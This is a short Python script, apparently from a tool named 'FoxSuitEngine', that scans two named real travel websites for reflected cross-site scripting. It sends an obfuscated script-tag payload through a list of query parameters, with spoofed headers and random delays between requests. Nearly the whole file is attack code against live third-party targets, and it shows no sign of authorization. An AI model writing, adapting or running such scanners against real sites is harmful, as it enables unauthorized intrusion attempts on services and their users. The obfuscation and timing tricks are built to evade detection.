from mods.suit_h1_verified import suit
import requests, time, random

def send_payloads(target):
    for path in suit["navigate"]:
        try:
            requests.get(target + path, headers=suit["headers"], timeout=5)
        except:
            pass

    base_payload = "<script>alert(1)</script>"
    obf_payload = suit["obfuscate"](base_payload)

    for param in suit["params"]:
        url = f"{target}?{param}={obf_payload}"
        try:
            r = requests.get(url, headers=suit["headers"], timeout=7)
            print(f"[{r.status_code} :: TEST] {url}")
        except:
            print(f"[ERROR] Skipped {url}")
        time.sleep(random.choice(suit["delay"]))

if __name__ == "__main__":
    targets = ["https://kayak.ai", "https://www.momondo.com"]
    for t in targets:
        print(f"[FoxSuitEngine :: {suit['name']}] {t}")
        send_payloads(t)
        print()
